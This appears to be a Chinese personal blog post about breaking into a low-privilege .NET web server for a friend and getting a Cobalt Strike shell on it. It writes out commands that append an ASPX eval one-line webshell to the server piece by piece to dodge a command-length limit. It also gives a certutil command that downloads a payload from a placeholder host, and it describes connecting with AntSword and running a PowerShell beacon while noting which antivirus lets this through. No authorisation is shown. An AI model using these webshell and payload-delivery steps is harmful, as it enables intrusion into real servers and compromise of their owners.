
今天朋友拿着一个小马问我，怎么弹 msf。其实 msf 我不熟，我还是喜欢 CS。下面记录一下 CS 上线的过程：


.NET的网站，权限低：

![title](https://leanote.com/api/file/getImage?fileId=5ebd2d15ab64414b4b05ab03)

一些基本信息：

![title](https://leanote.com/api/file/getImage?fileId=5ebd35feab64414b4b05bb92)

![title](https://leanote.com/api/file/getImage?fileId=5ebd2d7aab6441494905ac8f)

![title](https://leanote.com/api/file/getImage?fileId=5ebd2d99ab64414b4b05abef)



试了下机器出网没问题，于是想直接反弹 shell，但是命令被截断了，倒没有过滤什么特殊字符，但是输入的命令有长度限制：


![title](https://leanote.com/api/file/getImage?fileId=5ebd2e33ab64414b4b05ace8)

不过好在是 2008 R2 的机器，没有 defender 拦我。趋势基本不拦截 webshell，也不拦截 powershell。所以随便想随便写个 aspx 的一句话木马进去就行了。

通过追加文件的方式一点点写入一句话木马，每次在特殊字符处截断：
```
dir  D:\SRM\WEB\config\

type D:\SRM\WEB\config\1.txt


ehco. > D:\SRM\WEB\config\2.aspx
>> D:\SRM\WEB\config\2.aspx set /p="<%@ P" 
>> D:\SRM\WEB\config\2.aspx set /p="age L"
>> D:\SRM\WEB\config\2.aspx set /p="anguage="
>> D:\SRM\WEB\config\2.aspx set /p="""
>> D:\SRM\WEB\config\2.aspx set /p="Jscript"
>> D:\SRM\WEB\config\2.aspx set /p="""
>> D:\SRM\WEB\config\2.aspx set /p="%><%"
>> D:\SRM\WEB\config\2.aspx set /p="eval(Request"
>> D:\SRM\WEB\config\2.aspx set /p=".Item["
>> D:\SRM\WEB\config\2.aspx set /p="""
>> D:\SRM\WEB\config\2.aspx set /p="pass"
>> D:\SRM\WEB\config\2.aspx set /p="""
>> D:\SRM\WEB\config\2.aspx set /p="],"
>> D:\SRM\WEB\config\2.aspx set /p="""
>> D:\SRM\WEB\config\2.aspx set /p="unsafe"
>> D:\SRM\WEB\config\2.aspx set /p="""
>> D:\SRM\WEB\config\2.aspx set /p=");%>"
```

然后就写好了：

![title](https://leanote.com/api/file/getImage?fileId=5ebd2f2fab6441494905af67)


菜刀连失败：

![title](https://leanote.com/api/file/getImage?fileId=5ebd2f59ab64414b4b05aea1)


于是想传个 CS 的 Powershell Command payload 文件上去。为了 bypass 命令执行的长度限制：

```
1. 创建一个文件 1.bat
2. 1.bat 的内容为
certutil -urlcache -split -f http://xxxxx:8000/2.bat
2.bat 就是 Powershell Command payload
```

但是失败了！

![title](https://leanote.com/api/file/getImage?fileId=5ebd2ff0ab6441494905b0ab)


emmmm，陷入僵局。但是回头看我传上去的一句话木马。解析正常可通过 web 访问。

尝试通过 AntSword 去连，当然连接测试也是失败的。不过呢，仅仅是设置了连接编码方式为 base64，就连接成功了！甚至没有改 UA 和发包。

于是我获得了虚拟终端，在虚拟终端里面，可没有长度限制。又有powershell.exe 进程，又没什么（defender）防护，直接在命令行执行 Powershell command payload：

![title](https://leanote.com/api/file/getImage?fileId=5ebd30c0ab6441494905b213)


然后在下就喜提 CS shell 了。剩下的提权和之后的事情就交还给我朋友了。


